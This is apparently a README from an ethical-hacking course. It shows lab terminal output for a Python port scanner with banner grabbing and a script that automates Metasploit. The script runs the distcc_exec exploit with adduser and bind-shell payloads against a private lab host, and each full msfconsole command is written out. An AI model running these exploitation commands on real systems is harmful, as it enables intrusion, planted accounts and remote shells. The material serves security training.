 ```bash
 pip install --upgrade pip
 pip install -r requirements.txt
 ```
~~~shell
$ pip freeze > requirements.txt
~~~


1. <a href="#port_scanner">Port Scanner</a>
2. <a href="#exploits_and_payloads">Exploits and Payloads</a>


---

### 1. **Port Scanner** <a name="port_scanner"></a> 

    ```pycon
    cd 1_port_scan
    ```
    ```pycon
    ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/1_port_scan]
    └─$ python3 port_scanner_1.py -t 10.0.2.4 -p 100
    
    Starting Start For 10.0.2.4:
    [+] Port Opened 21
    [+] Port Opened 22
    [+] Port Opened 23
    [+] Port Opened 25
    [+] Port Opened 53
    [+] Port Opened 80
    ```
    
    Some servers may consider such requests as a hacking attempt and block your IP address:
    ```pycon
    ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/1_port_scan]
    └─$ python3 port_scanner_2.py -t 10.0.2.1,10.0.2.4 -p 100
    [*] Scanning Multiple Targets
    
    Starting Start For 10.0.2.1:
    
    Starting Start For 10.0.2.4:
    [+] Port Opened 21
    Banner: b'220 (vsFTPd 2.3.4)\r\n530 Please login with USER and PASS.\r\n'
    
    [+] Port Opened 22
    Banner: b'SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n'
    
    [+] Port Opened 23
    Banner: b"\xff\xfd\x18\xff\xfd \xff\xfd#\xff\xfd'"
    
    [+] Port Opened 25
    Banner: b'220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\r\n'
    
    [+] Port Opened 53
    Banner: b''
    
    [+] Port Opened 80
    Banner: b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n<hr>\n<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at metasploitable.localdomain Port 80</address>\n</body></html>\n'
    
    ```

2. **Exploits and Payloads** <a name="exploits_and_payloads"></a>  

    ```pycon
    cd 2_exploits_and_payloads
    ```
   
   ```pycon
   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ sudo python service_info_3.py 
   
   [sudo] пароль для kali: 
   {'PORT': '21/tcp', 'STATE': 'open', 'SERVICE': 'ftp', 'VERSION': 'vsftpd 2.3.4'}
   ```

   ```pycon
   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ python3 get_exploits_MSF.py   
           
   exploit/windows/ssh/freeftpd_key_exchange
   exploit/windows/ssh/freesshd_key_exchange
   exploit/windows/ssh/freesshd_authbypass
   exploit/windows/ssh/putty_msg_debug
   exploit/windows/ssh/securecrt_ssh1
   exploit/windows/ssh/sysax_ssh_username
   exploit/multi/http/vmware_vcenter_uploadova_rce
   exploit/windows/local/unquoted_service_path
   exploit/windows/local/unquoted_service_path
   ```
   
   ```pycon
   ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ python MSF_exploits_and_payloads_1.py
   
   Trying exploit:  exploit/unix/misc/distcc_exec
   Trying payload:  payload/cmd/unix/adduser
   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/adduser; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/adduser
   - - - - - - - - - - - - - - - - - - - - 
   
   Trying payload:  payload/cmd/unix/bind_perl
   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/bind_perl; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/bind_perl
   - - - - - - - - - - - - - - - - - - - - 
   
   Trying payload:  payload/cmd/unix/bind_perl_ipv6
   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/bind_perl_ipv6; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/bind_perl_ipv6
   - - - - - - - - - - - - - - - - - - - - 
   
   ```